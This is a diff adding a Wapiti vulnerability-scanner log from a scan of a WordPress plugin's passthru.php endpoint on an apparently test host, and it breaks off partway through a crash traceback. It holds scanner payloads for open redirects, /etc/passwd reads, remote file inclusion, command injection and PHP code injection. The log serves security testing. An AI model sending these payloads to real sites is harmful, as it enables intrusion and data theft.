@@ -1,0 +1,395 @@
+2024-03-21 13:45:11.236 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:11.364 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 13:45:11.364 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_966f5933.db
+2024-03-21 13:45:11.367 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-21 13:45:11.396 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 13:45:11.396 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 13:45:11.488 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 13:45:11.502 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 13:45:11.502 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 13:45:11.536 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 13:45:11.546 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:11.546 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-21 13:45:11.612 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 13:45:11.613 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php via injection in the query string
+2024-03-21 13:45:11.613 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 13:45:11.613 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https%3A%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 13:45:11.613 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 13:45:11.614 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2F%2Fopenbugbounty.org%2F
+2024-03-21 13:45:11.677 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 13:45:11.678 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php via injection in the query string
+2024-03-21 13:45:11.678 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 13:45:11.678 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 13:45:11.678 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 13:45:11.692 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 13:45:11.715 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:11.721 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-21 13:45:11.721 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-21 13:45:11.777 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-21 13:45:11.777 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-21 13:45:11.851 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 13:45:11.867 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:11.872 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-21 13:45:11.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-21 13:45:11.885 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2Fetc%2Fpasswd (0)
+2024-03-21 13:45:11.894 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2Fetc%2Fpasswd%00 (0)
+2024-03-21 13:45:11.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2Fetc%2Fservices (0)
+2024-03-21 13:45:11.908 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2Fetc%2Fservices%00 (0)
+2024-03-21 13:45:11.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-21 13:45:11.926 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x72a806394900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x72a806394860>
+    │       └ <function run at 0x72a80b0a3560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x72a8065d3240>
+           │      └ <function Runner.run at 0x72a80af2efc0>
+           └ <asyncio.runners.Runner object at 0x72a80a324d90>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x72a80af2cc20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x72a80a324d90>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x72a80af2cb80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x72a80af2e980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x72a80b090e00>
+    └ <Handle <TaskStepMethWrapper object at 0x72a804d2cc40>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x72a804d2cc40>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x72a804d2cc40>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x72a804d2cc40>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x72a8090ee8d0 [unset]>
+          │   └ <function Wapiti.attack at 0x72a80640e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x72a806664250>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x72a804d25f50>
+          │             │      └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+          │             └ <function ModuleFile.attack at 0x72a804ee4900>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x72a8066f76d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cet...
+                     │    │       └ <function AsyncCrawler.async_send at 0x72a809d8e020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x72a8066f76d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cet...
+                     │    └ <function AsyncCrawler.async_get at 0x72a809d8e160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>, GET http://web/wp-content/plugins/webp-converter-for-media/i...
+                  └ <function AsyncCrawler.async_get at 0x72a809d8e0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x72a80a2f51c0>
+                     │    └ <httpx.AsyncClient object at 0x72a806702410>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x72a80a2f5260>
+                     └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x72a80a2f5300>
+                     └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5...
+              │    └ <function BaseClient._build_redirect_request at 0x72a80a2e7c40>
+              └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5...
+          │    └ <function BaseClient._redirect_url at 0x72a80a2e7d80>
+          └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x72a80a9e6390>
+          │   │              │       └ URL('http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Ce...
+          │   │              └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=C%3A%5CWindows%5CSystem32%5...
+          │   └ <function URL.copy_with at 0x72a80aa058a0>
+          └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x72a80aa04400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', query=None,...
+    │                     └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', 'query': None, 'fragment': None,...
+           └ <function urlparse at 0x72a80aa04220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices'
+    └ <function validate_path at 0x72a80aa04a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 13:45:11.968 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 13:45:12.174 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 3d472586-e789-11ee-91fc-0242ac160004 ... SUCCESS
+2024-03-21 13:45:12.180 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 13:45:12.198 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+2024-03-21 13:45:12.201 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%3Benv%3B (0)
+2024-03-21 13:45:12.211 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%7Cenv%7C (0)
+2024-03-21 13:45:12.216 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=a%3Benv%3B (0)
+2024-03-21 13:45:12.222 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=a%3Benv%3B (0)
+2024-03-21 13:45:12.228 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-21 13:45:12.236 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%3Benv%3B (0)
+2024-03-21 13:45:12.245 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz%0Aenv%3B (0)
+2024-03-21 13:45:12.253 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%26set%26 (0)
+2024-03-21 13:45:12.262 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=set (0)
+2024-03-21 13:45:12.271 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=env (0)
+2024-03-21 13:45:12.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%2Fe%00 (0)
+2024-03-21 13:45:12.282 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.294 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.300 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.305 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.310 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.322 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.328 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.333 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 13:45:12.347 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 13:45:12.355 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-21 13:45:12.360 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x72a806394900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x72a806394860>
+    │       └ <function run at 0x72a80b0a3560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x72a8065d3240>
+           │      └ <function Runner.run at 0x72a80af2efc0>
+           └ <asyncio.runners.Runner object at 0x72a80a324d90>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x72a80af2cc20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x72a80a324d90>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x72a80af2cb80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x72a80af2e980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x72a80b090e00>
+    └ <Handle <TaskStepMethWrapper object at 0x72a80446a650>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x72a80446a650>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x72a80446a650>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x72a80446a650>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x72a8090ee8d0 [unset]>
+          │   └ <function Wapiti.attack at 0x72a80640e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x72a806664250>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x72a804f0e1d0>
+          │             │      └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=fuzz (0)
+          │             └ <function ModuleExec.attack at 0x72a804e5ad40>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x72a8059e0490>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwM...
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x72a809d8e020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x72a8059e0490>
+    └ <wapitiCore.net.response.Response object at 0x72a80445f250>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwM...
+                     │    └ <function AsyncCrawler.async_get at 0x72a809d8e160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>, GET http://web/wp-content/plugins/webp-converter-for-media/i...
+                  └ <function AsyncCrawler.async_get at 0x72a809d8e0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x72a80a2f51c0>
+                     │    └ <httpx.AsyncClient object at 0x72a806702410>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x72a806685e10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x72a80a2f5260>
+                     └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x72a80a2f5300>
+                     └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAg...
+              │    └ <function BaseClient._build_redirect_request at 0x72a80a2e7c40>
+              └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAg...
+          │    └ <function BaseClient._redirect_url at 0x72a80a2e7d80>
+          └ <httpx.AsyncClient object at 0x72a806702410>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x72a80a9e6390>
+          │   │              │       └ URL('http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRw...
+          │   │              └ <Request('GET', 'http://web/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=data%3A%3Bbase64%2CPD9waHAg...
+          │   └ <function URL.copy_with at 0x72a80aa058a0>
